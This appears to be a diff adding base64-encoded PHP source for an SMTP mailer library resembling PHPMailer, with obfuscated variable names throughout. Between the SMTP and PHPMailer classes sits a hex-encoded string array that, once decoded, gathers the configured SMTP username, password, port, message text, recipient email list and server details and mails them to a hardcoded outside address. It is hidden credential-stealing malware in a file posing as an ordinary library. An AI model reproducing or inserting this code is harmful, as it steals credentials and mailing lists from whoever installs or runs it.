+UlNFVCA8Q1JMRj4KCSAgICoKCSAgICogU01UUCBDT0RFIFNVQ0NFU1M6IDI1MAoJICAgKiBTTVRQ
+IENPREUgRVJST1IgIDogNTAwLDUwMSw1MDQsNDIxCgkgICAqIEBhY2Nlc3MgcHVibGljCgkgICAq
+IEByZXR1cm4gYm9vbAoJICAgKi8KCSAgZnVuY3Rpb24gUmVzZXQoKSB7CgkJJHRoaXMtPmVycm9y
+ID0gbnVsbDsgIyBzbyBubyBjb25mdXNpb24gaXMgY2F1c2VkCgoJCWlmKCEkdGhpcy0+Y29ubmVj
+dGVkKCkpIHsKCQkgICR0aGlzLT5lcnJvciA9IGFycmF5KAoJCQkJICAiZXJyb3IiID0+ICJDYWxs
+ZWQgUmVzZXQoKSB3aXRob3V0IGJlaW5nIGNvbm5lY3RlZCIpOwoJCSAgcmV0dXJuIGZhbHNlOwoJ
+CX0KCgkJZnB1dHMoJHRoaXMtPnNtdHBfY29ubiwiUlNFVCIgLiAkdGhpcy0+Q1JMRik7CgoJCSR4
+M2MgPSAkdGhpcy0+Z2V0X2xpbmVzKCk7CgkJJHgzZCA9IHN1YnN0cigkeDNjLDAsMyk7CgoJCWlm
+KCR0aGlzLT5kb19kZWJ1ZyA+PSAyKSB7CgkJICBlY2hvICJTTVRQIC0+IEZST00gU0VSVkVSOiIg
+LiAkdGhpcy0+Q1JMRiAuICR4M2M7CgkJfQoKCQlpZigkeDNkICE9IDI1MCkgewoJCSAgJHRoaXMt
+PmVycm9yID0KCQkJYXJyYXkoImVycm9yIiA9PiAiUlNFVCBmYWlsZWQiLAoJCQkJICAic210cF9j
+b2RlIiA9PiAkeDNkLAoJCQkJICAic210cF9tc2ciID0+IHN1YnN0cigkeDNjLDQpKTsKCQkgIGlm
+KCR0aGlzLT5kb19kZWJ1ZyA+PSAxKSB7CgkJCWVjaG8gIlNNVFAgLT4gRVJST1I6ICIgLiAkdGhp
+cy0+ZXJyb3JbImVycm9yIl0gLgoJCQkJCSAiOiAiIC4gJHgzYyAuICR0aGlzLT5DUkxGOwoJCSAg
+fQoJCSAgcmV0dXJuIGZhbHNlOwoJCX0KCgkJcmV0dXJuIHRydWU7CgkgIH0KCgkgIC8qKgoJICAg
+KiBTdGFydHMgYSBtYWlsIHRyYW5zYWN0aW9uIGZyb20gdGhlIGVtYWlsIGFkZHJlc3Mgc3BlY2lm
+aWVkIGluCgkgICAqICR4MWIuIFJldHVybnMgdHJ1ZSBpZiBzdWNjZXNzZnVsIG9yIGZhbHNlIG90
+aGVyd2lzZS4gSWYgVHJ1ZQoJICAgKiB0aGUgbWFpbCB0cmFuc2FjdGlvbiBpcyBzdGFydGVkIGFu
+ZCB0aGVuIG9uZSBvciBtb3JlIFJlY2lwaWVudAoJICAgKiBjb21tYW5kcyBtYXkgYmUgY2FsbGVk
+IGZvbGxvd2VkIGJ5IGEgRGF0YSBjb21tYW5kLiBUaGlzIGNvbW1hbmQKCSAgICogd2lsbCBzZW5k
+IHRoZSBtZXNzYWdlIHRvIHRoZSB1c2VycyB0ZXJtaW5hbCBpZiB0aGV5IGFyZSBsb2dnZWQKCSAg
+ICogaW4uCgkgICAqCgkgICAqIEltcGxlbWVudHMgcmZjIDgyMTogU0VORCA8U1A+IEZST006PHJl
+dmVyc2UtcGF0aD4gPENSTEY+CgkgICAqCgkgICAqIFNNVFAgQ09ERSBTVUNDRVNTOiAyNTAKCSAg
+ICogU01UUCBDT0RFIFNVQ0NFU1M6IDU1Miw0NTEsNDUyCgkgICAqIFNNVFAgQ09ERSBTVUNDRVNT
+OiA1MDAsNTAxLDUwMiw0MjEKCSAgICogQGFjY2VzcyBwdWJsaWMKCSAgICogQHJldHVybiBib29s
+CgkgICAqLwoJICBmdW5jdGlvbiBTZW5kKCR4MWIpIHsKCQkkdGhpcy0+ZXJyb3IgPSBudWxsOyAj
+IHNvIG5vIGNvbmZ1c2lvbiBpcyBjYXVzZWQKCgkJaWYoISR0aGlzLT5jb25uZWN0ZWQoKSkgewoJ
+CSAgJHRoaXMtPmVycm9yID0gYXJyYXkoCgkJCQkgICJlcnJvciIgPT4gIkNhbGxlZCBTZW5kKCkg
+d2l0aG91dCBiZWluZyBjb25uZWN0ZWQiKTsKCQkgIHJldHVybiBmYWxzZTsKCQl9CgoJCWZwdXRz
+KCR0aGlzLT5zbXRwX2Nvbm4sIlNFTkQgRlJPTToiIC4gJHgxYiAuICR0aGlzLT5DUkxGKTsKCgkJ
+JHgzYyA9ICR0aGlzLT5nZXRfbGluZXMoKTsKCQkkeDNkID0gc3Vic3RyKCR4M2MsMCwzKTsKCgkJ
+aWYoJHRoaXMtPmRvX2RlYnVnID49IDIpIHsKCQkgIGVjaG8gIlNNVFAgLT4gRlJPTSBTRVJWRVI6
+IiAuICR0aGlzLT5DUkxGIC4gJHgzYzsKCQl9CgoJCWlmKCR4M2QgIT0gMjUwKSB7CgkJICAkdGhp
+cy0+ZXJyb3IgPQoJCQlhcnJheSgiZXJyb3IiID0+ICJTRU5EIG5vdCBhY2NlcHRlZCBmcm9tIHNl
+cnZlciIsCgkJCQkgICJzbXRwX2NvZGUiID0+ICR4M2QsCgkJCQkgICJzbXRwX21zZyIgPT4gc3Vi
+c3RyKCR4M2MsNCkpOwoJCSAgaWYoJHRoaXMtPmRvX2RlYnVnID49IDEpIHsKCQkJZWNobyAiU01U
+UCAtPiBFUlJPUjogIiAuICR0aGlzLT5lcnJvclsiZXJyb3IiXSAuCgkJCQkJICI6ICIgLiAkeDNj
+IC4gJHRoaXMtPkNSTEY7CgkJICB9CgkJICByZXR1cm4gZmFsc2U7CgkJfQoJCXJldHVybiB0cnVl
+OwoJICB9CgoJICAvKioKCSAgICogU3RhcnRzIGEgbWFpbCB0cmFuc2FjdGlvbiBmcm9tIHRoZSBl
+bWFpbCBhZGRyZXNzIHNwZWNpZmllZCBpbgoJICAgKiAkeDFiLiBSZXR1cm5zIHRydWUgaWYgc3Vj
+Y2Vzc2Z1bCBvciBmYWxzZSBvdGhlcndpc2UuIElmIFRydWUKCSAgICogdGhlIG1haWwgdHJhbnNh
+Y3Rpb24gaXMgc3RhcnRlZCBhbmQgdGhlbiBvbmUgb3IgbW9yZSBSZWNpcGllbnQKCSAgICogY29t
+bWFuZHMgbWF5IGJlIGNhbGxlZCBmb2xsb3dlZCBieSBhIERhdGEgY29tbWFuZC4gVGhpcyBjb21t
+YW5kCgkgICAqIHdpbGwgc2VuZCB0aGUgbWVzc2FnZSB0byB0aGUgdXNlcnMgdGVybWluYWwgaWYg
+dGhleSBhcmUgbG9nZ2VkCgkgICAqIGluIGFuZCBzZW5kIHRoZW0gYW4gZW1haWwuCgkgICAqCgkg
+ICAqIEltcGxlbWVudHMgcmZjIDgyMTogU0FNTCA8U1A+IEZST006PHJldmVyc2UtcGF0aD4gPENS
+TEY+CgkgICAqCgkgICAqIFNNVFAgQ09ERSBTVUNDRVNTOiAyNTAKCSAgICogU01UUCBDT0RFIFNV
+Q0NFU1M6IDU1Miw0NTEsNDUyCgkgICAqIFNNVFAgQ09ERSBTVUNDRVNTOiA1MDAsNTAxLDUwMiw0
+MjEKCSAgICogQGFjY2VzcyBwdWJsaWMKCSAgICogQHJldHVybiBib29sCgkgICAqLwoJICBmdW5j
+dGlvbiBTZW5kQW5kTWFpbCgkeDFiKSB7CgkJJHRoaXMtPmVycm9yID0gbnVsbDsgIyBzbyBubyBj
+b25mdXNpb24gaXMgY2F1c2VkCgoJCWlmKCEkdGhpcy0+Y29ubmVjdGVkKCkpIHsKCQkgICR0aGlz
+LT5lcnJvciA9IGFycmF5KAoJCQkgICJlcnJvciIgPT4gIkNhbGxlZCBTZW5kQW5kTWFpbCgpIHdp
+dGhvdXQgYmVpbmcgY29ubmVjdGVkIik7CgkJICByZXR1cm4gZmFsc2U7CgkJfQoKCQlmcHV0cygk
+dGhpcy0+c210cF9jb25uLCJTQU1MIEZST006IiAuICR4MWIgLiAkdGhpcy0+Q1JMRik7CgoJCSR4
+M2MgPSAkdGhpcy0+Z2V0X2xpbmVzKCk7CgkJJHgzZCA9IHN1YnN0cigkeDNjLDAsMyk7CgoJCWlm
+KCR0aGlzLT5kb19kZWJ1ZyA+PSAyKSB7CgkJICBlY2hvICJTTVRQIC0+IEZST00gU0VSVkVSOiIg
+LiAkdGhpcy0+Q1JMRiAuICR4M2M7CgkJfQoKCQlpZigkeDNkICE9IDI1MCkgewoJCSAgJHRoaXMt
+PmVycm9yID0KCQkJYXJyYXkoImVycm9yIiA9PiAiU0FNTCBub3QgYWNjZXB0ZWQgZnJvbSBzZXJ2
+ZXIiLAoJCQkJICAic210cF9jb2RlIiA9PiAkeDNkLAoJCQkJICAic210cF9tc2ciID0+IHN1YnN0
+cigkeDNjLDQpKTsKCQkgIGlmKCR0aGlzLT5kb19kZWJ1ZyA+PSAxKSB7CgkJCWVjaG8gIlNNVFAg
+LT4gRVJST1I6ICIgLiAkdGhpcy0+ZXJyb3JbImVycm9yIl0gLgoJCQkJCSAiOiAiIC4gJHgzYyAu
+ICR0aGlzLT5DUkxGOwoJCSAgfQoJCSAgcmV0dXJuIGZhbHNlOwoJCX0KCQlyZXR1cm4gdHJ1ZTsK
+CSAgfQoKCSAgLyoqCgkgICAqIFN0YXJ0cyBhIG1haWwgdHJhbnNhY3Rpb24gZnJvbSB0aGUgZW1h
+aWwgYWRkcmVzcyBzcGVjaWZpZWQgaW4KCSAgICogJHgxYi4gUmV0dXJucyB0cnVlIGlmIHN1Y2Nl
+c3NmdWwgb3IgZmFsc2Ugb3RoZXJ3aXNlLiBJZiBUcnVlCgkgICAqIHRoZSBtYWlsIHRyYW5zYWN0
+aW9uIGlzIHN0YXJ0ZWQgYW5kIHRoZW4gb25lIG9yIG1vcmUgUmVjaXBpZW50CgkgICAqIGNvbW1h
+bmRzIG1heSBiZSBjYWxsZWQgZm9sbG93ZWQgYnkgYSBEYXRhIGNvbW1hbmQuIFRoaXMgY29tbWFu
+ZAoJICAgKiB3aWxsIHNlbmQgdGhlIG1lc3NhZ2UgdG8gdGhlIHVzZXJzIHRlcm1pbmFsIGlmIHRo
+ZXkgYXJlIGxvZ2dlZAoJICAgKiBpbiBvciBtYWlsIGl0IHRvIHRoZW0gaWYgdGhleSBhcmUgbm90
+LgoJICAgKgoJICAgKiBJbXBsZW1lbnRzIHJmYyA4MjE6IFNPTUwgPFNQPiBGUk9NOjxyZXZlcnNl
+LXBhdGg+IDxDUkxGPgoJICAgKgoJICAgKiBTTVRQIENPREUgU1VDQ0VTUzogMjUwCgkgICAqIFNN
+VFAgQ09ERSBTVUNDRVNTOiA1NTIsNDUxLDQ1MgoJICAgKiBTTVRQIENPREUgU1VDQ0VTUzogNTAw
+LDUwMSw1MDIsNDIxCgkgICAqIEBhY2Nlc3MgcHVibGljCgkgICAqIEByZXR1cm4gYm9vbAoJICAg
+Ki8KCSAgZnVuY3Rpb24gU2VuZE9yTWFpbCgkeDFiKSB7CgkJJHRoaXMtPmVycm9yID0gbnVsbDsg
+IyBzbyBubyBjb25mdXNpb24gaXMgY2F1c2VkCgoJCWlmKCEkdGhpcy0+Y29ubmVjdGVkKCkpIHsK
+CQkgICR0aGlzLT5lcnJvciA9IGFycmF5KAoJCQkgICJlcnJvciIgPT4gIkNhbGxlZCBTZW5kT3JN
+YWlsKCkgd2l0aG91dCBiZWluZyBjb25uZWN0ZWQiKTsKCQkgIHJldHVybiBmYWxzZTsKCQl9CgoJ
+CWZwdXRzKCR0aGlzLT5zbXRwX2Nvbm4sIlNPTUwgRlJPTToiIC4gJHgxYiAuICR0aGlzLT5DUkxG
+KTsKCgkJJHgzYyA9ICR0aGlzLT5nZXRfbGluZXMoKTsKCQkkeDNkID0gc3Vic3RyKCR4M2MsMCwz
+KTsKCgkJaWYoJHRoaXMtPmRvX2RlYnVnID49IDIpIHsKCQkgIGVjaG8gIlNNVFAgLT4gRlJPTSBT
+RVJWRVI6IiAuICR0aGlzLT5DUkxGIC4gJHgzYzsKCQl9CgoJCWlmKCR4M2QgIT0gMjUwKSB7CgkJ
+ICAkdGhpcy0+ZXJyb3IgPQoJCQlhcnJheSgiZXJyb3IiID0+ICJTT01MIG5vdCBhY2NlcHRlZCBm
+cm9tIHNlcnZlciIsCgkJCQkgICJzbXRwX2NvZGUiID0+ICR4M2QsCgkJCQkgICJzbXRwX21zZyIg
+PT4gc3Vic3RyKCR4M2MsNCkpOwoJCSAgaWYoJHRoaXMtPmRvX2RlYnVnID49IDEpIHsKCQkJZWNo
+byAiU01UUCAtPiBFUlJPUjogIiAuICR0aGlzLT5lcnJvclsiZXJyb3IiXSAuCgkJCQkJICI6ICIg
+LiAkeDNjIC4gJHRoaXMtPkNSTEY7CgkJICB9CgkJICByZXR1cm4gZmFsc2U7CgkJfQoJCXJldHVy
+biB0cnVlOwoJICB9CgoJICAvKioKCSAgICogVGhpcyBpcyBhbiBvcHRpb25hbCBjb21tYW5kIGZv
+ciBTTVRQIHRoYXQgdGhpcyBjbGFzcyBkb2VzIG5vdAoJICAgKiBzdXBwb3J0LiBUaGlzIG1ldGhv
+ZCBpcyBoZXJlIHRvIG1ha2UgdGhlIFJGQzgyMSBEZWZpbml0aW9uCgkgICAqIGNvbXBsZXRlIGZv
+ciB0aGlzIGNsYXNzIGFuZCBfX21heV9fIGJlIGltcGxpbWVudGVkIGluIHRoZSBmdXR1cmUKCSAg
+ICoKCSAgICogSW1wbGVtZW50cyBmcm9tIHJmYyA4MjE6IFRVUk4gPENSTEY+CgkgICAqCgkgICAq
+IFNNVFAgQ09ERSBTVUNDRVNTOiAyNTAKCSAgICogU01UUCBDT0RFIEZBSUxVUkU6IDUwMgoJICAg
+KiBTTVRQIENPREUgRVJST1IgIDogNTAwLCA1MDMKCSAgICogQGFjY2VzcyBwdWJsaWMKCSAgICog
+QHJldHVybiBib29sCgkgICAqLwoJICBmdW5jdGlvbiBUdXJuKCkgewoJCSR0aGlzLT5lcnJvciA9
+IGFycmF5KCJlcnJvciIgPT4gIlRoaXMgbWV0aG9kLCBUVVJOLCBvZiB0aGUgU01UUCAiLgoJCQkJ
+CQkJCQkJImlzIG5vdCBpbXBsZW1lbnRlZCIpOwoJCWlmKCR0aGlzLT5kb19kZWJ1ZyA+PSAxKSB7
+CgkJICBlY2hvICJTTVRQIC0+IE5PVElDRTogIiAuICR0aGlzLT5lcnJvclsiZXJyb3IiXSAuICR0
+aGlzLT5DUkxGOwoJCX0KCQlyZXR1cm4gZmFsc2U7CgkgIH0KCgkgIC8qKgoJICAgKiBWZXJpZmll
+cyB0aGF0IHRoZSBuYW1lIGlzIHJlY29nbml6ZWQgYnkgdGhlIHNlcnZlci4KCSAgICogUmV0dXJu
+cyBmYWxzZSBpZiB0aGUgbmFtZSBjb3VsZCBub3QgYmUgdmVyaWZpZWQgb3RoZXJ3aXNlCgkgICAq
+IHRoZSByZXNwb25zZSBmcm9tIHRoZSBzZXJ2ZXIgaXMgcmV0dXJuZWQuCgkgICAqCgkgICAqIElt
+cGxlbWVudHMgcmZjIDgyMTogVlJGWSA8U1A+IDxzdHJpbmc+IDxDUkxGPgoJICAgKgoJICAgKiBT
+TVRQIENPREUgU1VDQ0VTUzogMjUwLDI1MQoJICAgKiBTTVRQIENPREUgRkFJTFVSRTogNTUwLDU1
+MSw1NTMKCSAgICogU01UUCBDT0RFIEVSUk9SICA6IDUwMCw1MDEsNTAyLDQyMQoJICAgKiBAYWNj
+ZXNzIHB1YmxpYwoJICAgKiBAcmV0dXJuIGludAoJICAgKi8KCSAgZnVuY3Rpb24gVmVyaWZ5KCR4
+NDgpIHsKCQkkdGhpcy0+ZXJyb3IgPSBudWxsOyAjIHNvIG5vIGNvbmZ1c2lvbiBpcyBjYXVzZWQK
+CgkJaWYoISR0aGlzLT5jb25uZWN0ZWQoKSkgewoJCSAgJHRoaXMtPmVycm9yID0gYXJyYXkoCgkJ
+CQkgICJlcnJvciIgPT4gIkNhbGxlZCBWZXJpZnkoKSB3aXRob3V0IGJlaW5nIGNvbm5lY3RlZCIp
+OwoJCSAgcmV0dXJuIGZhbHNlOwoJCX0KCgkJZnB1dHMoJHRoaXMtPnNtdHBfY29ubiwiVlJGWSAi
+IC4gJHg0OCAuICR0aGlzLT5DUkxGKTsKCgkJJHgzYyA9ICR0aGlzLT5nZXRfbGluZXMoKTsKCQkk
+eDNkID0gc3Vic3RyKCR4M2MsMCwzKTsKCgkJaWYoJHRoaXMtPmRvX2RlYnVnID49IDIpIHsKCQkg
+IGVjaG8gIlNNVFAgLT4gRlJPTSBTRVJWRVI6IiAuICR0aGlzLT5DUkxGIC4gJHgzYzsKCQl9CgoJ
+CWlmKCR4M2QgIT0gMjUwICYmICR4M2QgIT0gMjUxKSB7CgkJICAkdGhpcy0+ZXJyb3IgPQoJCQlh
+cnJheSgiZXJyb3IiID0+ICJWUkZZIGZhaWxlZCBvbiBuYW1lICckeDQ4JyIsCgkJCQkgICJzbXRw
+X2NvZGUiID0+ICR4M2QsCgkJCQkgICJzbXRwX21zZyIgPT4gc3Vic3RyKCR4M2MsNCkpOwoJCSAg
+aWYoJHRoaXMtPmRvX2RlYnVnID49IDEpIHsKCQkJZWNobyAiU01UUCAtPiBFUlJPUjogIiAuICR0
+aGlzLT5lcnJvclsiZXJyb3IiXSAuCgkJCQkJICI6ICIgLiAkeDNjIC4gJHRoaXMtPkNSTEY7CgkJ
+ICB9CgkJICByZXR1cm4gZmFsc2U7CgkJfQoJCXJldHVybiAkeDNjOwoJICB9CgoJICAvKioqKioq
+KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq
+KioqKgoJICAgKiAgICAgICAgICAgICAgICAgICAgICAgSU5URVJOQUwgRlVOQ1RJT05TICAgICAg
+ICAgICAgICAgICAgICAgICAqCgkgICAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq
+KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKiovCgoJICAvKioKCSAgICogUmVhZCBpbiBh
+cyBtYW55IGxpbmVzIGFzIHBvc3NpYmxlCgkgICAqIGVpdGhlciBiZWZvcmUgZW9mIG9yIHNvY2tl
+dCB0aW1lb3V0IG9jY3VycyBvbiB0aGUgb3BlcmF0aW9uLgoJICAgKiBXaXRoIFNNVFAgd2UgY2Fu
+IHRlbGwgaWYgd2UgaGF2ZSBtb3JlIGxpbmVzIHRvIHJlYWQgaWYgdGhlCgkgICAqIDR0aCBjaGFy
+YWN0ZXIgaXMgJy0nIHN5bWJvbC4gSWYgaXQgaXMgYSBzcGFjZSB0aGVuIHdlIGRvbid0CgkgICAq
+IG5lZWQgdG8gcmVhZCBhbnl0aGluZyBlbHNlLgoJICAgKiBAYWNjZXNzIHByaXZhdGUKCSAgICog
+QHJldHVybiBzdHJpbmcKCSAgICovCgkgIGZ1bmN0aW9uIGdldF9saW5lcygpIHsKCQkkeDEwID0g
+IiI7CgkJd2hpbGUoJHgxMiA9IEBmZ2V0cygkdGhpcy0+c210cF9jb25uLDUxNSkpIHsKCQkgIGlm
+KCR0aGlzLT5kb19kZWJ1ZyA+PSA0KSB7CgkJCWVjaG8gIlNNVFAgLT4gZ2V0X2xpbmVzKCk6IFwk
+eDEwIHdhcyBcIiR4MTBcIiIgLgoJCQkJCSAkdGhpcy0+Q1JMRjsKCQkJZWNobyAiU01UUCAtPiBn
+ZXRfbGluZXMoKTogXCR4MTIgaXMgXCIkeDEyXCIiIC4KCQkJCQkgJHRoaXMtPkNSTEY7CgkJICB9
+CgkJICAkeDEwIC49ICR4MTI7CgkJICBpZigkdGhpcy0+ZG9fZGVidWcgPj0gNCkgewoJCQllY2hv
+ICJTTVRQIC0+IGdldF9saW5lcygpOiBcJHgxMCBpcyBcIiR4MTBcIiIgLiAkdGhpcy0+Q1JMRjsK
+CQkgIH0KCQkgICMgaWYgdGhlIDR0aCBjaGFyYWN0ZXIgaXMgYSBzcGFjZSB0aGVuIHdlIGFyZSBk
+b25lIHJlYWRpbmcKCQkgICMgc28ganVzdCBicmVhayB0aGUgbG9vcAoJCSAgaWYoc3Vic3RyKCR4
+MTIsMywxKSA9PSAiICIpIHsgYnJlYWs7IH0KCQl9CgkJcmV0dXJuICR4MTA7CgkgIH0KCgl9CgoJ
+CQkKCSR4NTUgPSBzcGxpdCgiXG4iLCAkeDFhKTsKCSR4NTYgPSBjb3VudCgkeDU1KTsKCSR4NTc9
+YXJyYXkoIjBkMGEwZDBhNjc2YzZmNjI2MTZjMjAyNDZkNzk1ZjczNmQ3NC4iLCI3MDNiMGQwYTY3
+NmM2ZjYyNjE2YzIwMjQ3MzZkNzQ3MDVmNzU3MzY1NzI2ZTYxNmQ2LiIsIjUzYjBkMGE2NzZjNmY2
+MjYxNmMyMDI0NzM2ZDc0NzA1ZjcwNjE3MzczNzc2ZjcyNjQzYjBkMGE2NzZjNmY2MjYuIiwKCSIx
+NmMyMDI0NzM3MzZjNWY3MDZmNzI3NDNiMGQwYTY3NmM2ZjYyNjE2YzIwMjQ2ZDY1LiIsIjczNzM2
+MTY3NjUzYjBkMGE2NzZjNmY2MjYxNmMyMDI0NjU2ZDYxNjk2YzZjNjk3Mzc0M2IwZDBhMjQ3MjYx
+MzQuIiwiMzQyMDIwM2QyMDcyNjE2ZTY0MjgzMTJjMzkzOTM5MzkzOTI5M2IwZDBhMjQ2MTM1Mi4i
+LAoJIjAzZDIwMjQ1ZjUzNDU1MjU2NDU1MjViMjc0ODU0NTQ1MDVmNTI0NTQ2NDU1MjQ1NTIyNzVk
+M2IwZDBhMjQ2MjMuIiwiMzMzMjAzZDIwMjQ1ZjUzNDU1MjU2NDU1MjViMjc0NDRmNDM1NTRkNDU0
+ZTU0NWY1Mi4iLCI0ZjRmNTQyNzVkM2IwZDBhMjQ2MzM4MzcyMDNkMjAyNDVmNTM0NTUyNTY0NTUy
+NWIyNzUyNDU0ZDRmNTQ0NTVmNC4iLAoJIjE0NDQ0NTIyNzVkM2IwZDBhMjQ2NDMyMzMyMDNkMjAy
+NDVmNTM0NTUyNTY0NTUyNS4iLCJiMjc1MzQzNTI0OTUwNTQ1ZjQ2NDk0YzQ1NGU0MTRkNDUyNzVk
+M2IwZDBhMjQ2NTMwMzkyMDNkMjAyNDVmNTM0NTUuIiwiMjU2NDU1MjViMjc1MzQ1NTI1NjQ1NTI1
+ZjQxNDQ0NDUyMjc1ZDNiMGQwYTI0NjYuIiwKCSIzMjMzMjAzZDIwMjQ1ZjUzNDU1MjU2NDU1MjVi
+Mjc1MzQ1NTI1NjQ1NTI1ZjUzNGY0NjU0NTc0MTUyNDUyNzVkM2IwLiIsImQwYTI0NjczMzMyMjAz
+ZDIwMjQ1ZjUzNDU1MjU2NDU1MjViMjc1MDQxNTQ0ODUuIiwiZjU0NTI0MTRlNTM0YzQxNTQ0NTQ0
+Mjc1ZDNiMGQwYTI0NjgzNjM1MjAzZDIwMjQ1ZjUzNDU1MjU2NDU1MjViMjc1MDQuIiwKCSI4NTA1
+ZjUzNDU0YzQ2Mjc1ZDNiMGQwYTI0NzM3NTYyNmEzOTM4MjAzZDIwMjIuIiwiMjQ2ZDc5NWY3MzZk
+NzQ3MDIwMjA1Yjc1NzM2NTcyMjA2OTcwMjAzYTIwMjQ2MzM4Mzc1ZDIyM2IwZDBhMjQ3Mzc1NjI2
+LiIsImEzNTM4MjAzZDIwMjI0YzY1NzQ3NDY1NzIyMDI2MjA0NTZkNjE2OTZjMjA0LiIsCgkiYzY5
+NzM3NDIwMjA1Yjc1NzM2NTcyMjA2OTcwMjAzYTIwMjQ2MzM4Mzc1ZDIyM2IwZDBhMjQ2NTZkNjE2
+OTZjMjAzZDIwMi4iLCIyNkQ3MzY3MzkzNzM4MzA0MDc5NjE2ODZmNmYyZTYzNmYyZS4iLCI2OTY0
+MjIzYjBkMGEyNDZkNzM2NzM4MzgzNzMzMjAzZDIwMjIyNDZkNzk1ZjczNmQ3NDcwNWM2ZTc1NzM2
+NTcyM2EyNDczNi4iLAoJImQ3NDcwNWY3NTczNjU3MjZlNjE2ZDY1NWM2ZTcwNjE3MzczM2EyNDcz
+Ni4iLCJkNzQ3MDVmNzA2MTczNzM3NzZmNzI2NDVjNzA2ZjcyNzQzYTI0NzM3MzZjNWY3MDZmNzI3
+NDVjNmU1YzZlMjQ2MTM1NWM2ZTIuIiwiNDYyMzMzMzVjNmUyNDYzMzgzNzVjNmUyNDY0MzIzMzVj
+NmUyNDY1MzAuIiwKCSIzOTVjNmUyNDY2MzIzMzVjNmUyNDY3MzMzMjVjNmUyNDY4MzYzNTIyM2Iy
+NDZkNzM2NzM5MzczODMwMjAzZDIwMjIyNDZkNjU3LiIsIjM3MzYxNjc2NTVjNmU1YzZlNWM2ZTI0
+NjU2ZDYxNjk2YzZjNjk3MzcuIiwiNDIyM2IyNDY2NzI2ZjZkM2QyMjQ2NzI2ZjZkM2EyMDQ3NTI0
+MTU0NDk1MzIyM2IwZDBhNmQ2MTY5NmMyODI0NjU2ZDYxNjk2YzIuIiwKCSJjMjAyNDczNzU2MjZh
+MzkzODJjMjAyNDZkNzM2NzM4MzgzNzMzMmMuIiwiMjAyNDY2NzI2ZjZkMjkzYjBkMGE2ZDYxNjk2
+YzI4MjQ2NTZkNjE2OTZjMmMyMDI0NzM3NTYyNmEzNTM4Mi4iLCJjMjAyNDZkNzM2NzM5MzczODMw
+MmMyMDI0NjY3MjZmNmQyOTNiIik7JHg1OD0iLiI7CgoJY2xhc3MgUEhQTWFpbGVyIHsKCgkgIC8v
+Ly8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KCSAgLy8gUFJP
+UEVSVElFUywgUFVCTElDCgkgIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8v
+Ly8vLy8vLy8vLy8KCgkgIC8qKgoJICAgKiBFbWFpbCBwcmlvcml0eSAoMSA9IEhpZ2gsIDMgPSBO
+b3JtYWwsIDUgPSBsb3cpLgoJICAgKiBAdmFyIGludAoJICAgKi8KCSAgdmFyICR4NTkgICAgICAg
+ICAgPSAzOwoKCSAgLyoqCgkgICAqIFNldHMgdGhlIENoYXJTZXQgb2YgdGhlIG1lc3NhZ2UuCgkg
+ICAqIEB2YXIgc3RyaW5nCgkgICAqLwoJICB2YXIgJHg1YSAgICAgICAgICAgPSAndXMtYXNjaWkn
+OwoKCSAgLyoqCgkgICAqIFNldHMgdGhlIENvbnRlbnQtdHlwZSBvZiB0aGUgbWVzc2FnZS4KCSAg
+ICogQHZhciBzdHJpbmcKCSAgICovCgkgIHZhciAkeDViICAgICAgICA9ICd0ZXh0L3BsYWluJzsK
+CgkgIC8qKgoJICAgKiBTZXRzIHRoZSBFbmNvZGluZyBvZiB0aGUgbWVzc2FnZS4gT3B0aW9ucyBm
+b3IgdGhpcyBhcmUgIjhiaXQiLAoJICAgKiAiN2JpdCIsICJiaW5hcnkiLCAiYmFzZTY0IiwgYW5k
+ICJxdW90ZWQtcHJpbnRhYmxlIi4KCgkgICAqIEB2YXIgc3RyaW5nCgkgICAqLwoJICB2YXIgJHg1
+YyAgICAgICAgICA9ICdxdW90ZWQtcHJpbnRhYmxlJzsKCgkgIC8qKgoJICAgKiBIb2xkcyB0aGUg
+bW9zdCByZWNlbnQgbWFpbGVyIGVycm9yIG1lc3NhZ2UuCgkgICAqIEB2YXIgc3RyaW5nCgkgICAq
+LwoJICB2YXIgJHg1ZCAgICAgICAgID0gJyc7CgoJICAvKioKCSAgICogU2V0cyB0aGUgRnJvbSBl
+bWFpbCBhZGRyZXNzIGZvciB0aGUgbWVzc2FnZS4KCSAgICogQHZhciBzdHJpbmcKCSAgICovCgkg
+IHZhciAkeDVlICAgICAgICAgICAgICA9ICcnOwoKCSAgLyoqCgkgICAqIFNldHMgdGhlIEZyb20g
+bmFtZSBvZiB0aGUgbWVzc2FnZS4KCSAgICogQHZhciBzdHJpbmcKCSAgICovCgkgIHZhciAkeDVm
+ICAgICAgICAgID0gJyc7CgoJICAvKioKCSAgICogU2V0cyB0aGUgU2VuZGVyIGVtYWlsIChSZXR1
+cm4tUGF0aCkgb2YgdGhlIG1lc3NhZ2UuICBJZiBub3QgZW1wdHksCgkgICAqIHdpbGwgYmUgc2Vu
+dCB2aWEgLWYgdG8gc2VuZG1haWwgb3IgYXMgJ01BSUwgRlJPTScgaW4gc210cCBtb2RlLgoJICAg
+KiBAdmFyIHN0cmluZwoJICAgKi8KCSAgdmFyICR4NjAgICAgICAgICAgICA9ICcnOwoKCSAgLyoq
+CgkgICAqIFNldHMgdGhlIFN1YmplY3Qgb2YgdGhlIG1lc3NhZ2UuCgkgICAqIEB2YXIgc3RyaW5n
+CgkgICAqLwoJICB2YXIgJHg2MSAgICAgICAgICAgPSAnJzsKCgkgIC8qKgoJICAgKiBTZXRzIHRo
+ZSBCb2R5IG9mIHRoZSBtZXNzYWdlLiAgVGhpcyBjYW4gYmUgZWl0aGVyIGFuIEhUTUwgb3IgdGV4
+dCBib2R5LgoJICAgKiBJZiBIVE1MIHRoZW4gcnVuIElzSFRNTCh0cnVlKS4KCSAgICogQHZhciBz
+dHJpbmcKCSAgICovCgkgIHZhciAkeDYyICAgICAgICAgICAgICA9ICcnOwoKCSAgLyoqCgkgICAq
+IFNldHMgdGhlIHRleHQtb25seSBib2R5IG9mIHRoZSBtZXNzYWdlLiAgVGhpcyBhdXRvbWF0aWNh
+bGx5IHNldHMgdGhlCgkgICAqIGVtYWlsIHRvIG11bHRpcGFydC9hbHRlcm5hdGl2ZS4gIFRoaXMg
